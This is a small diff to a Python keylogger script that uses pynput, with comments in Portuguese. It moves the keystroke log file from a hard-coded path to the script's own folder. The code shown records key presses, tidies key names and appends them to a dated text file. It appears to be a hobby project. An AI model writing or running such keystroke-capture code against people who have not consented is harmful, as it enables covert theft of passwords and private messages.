@@ -1,9 +1,13 @@
 from pynput.keyboard import Listener
 import re
 import datetime
+import os
 
+# Diretório atual do arquivo
+current_directory = os.path.dirname(os.path.abspath(__file__))
 
-fileLog = "D:/User/Documents/Projetos Meus/Python/KeyLogger/text.txt"
+# Caminho para o arquivo de log
+fileLog = os.path.join(current_directory, "text.txt")
 date = datetime.datetime.now().strftime("%d-%m-%Y")
 fileName = fileLog + date + ".txt"
 
@@ -19,7 +23,6 @@ def x(k):
     k = re.sub(r'Key.shift', '', k)
     k = re.sub(r'Key.enter', ' Enter ', k)
     k = re.sub(r'Key.backspace', ' Backspace ', k)
-
 
     with open(fileName, "a") as log:
         log.write(k)
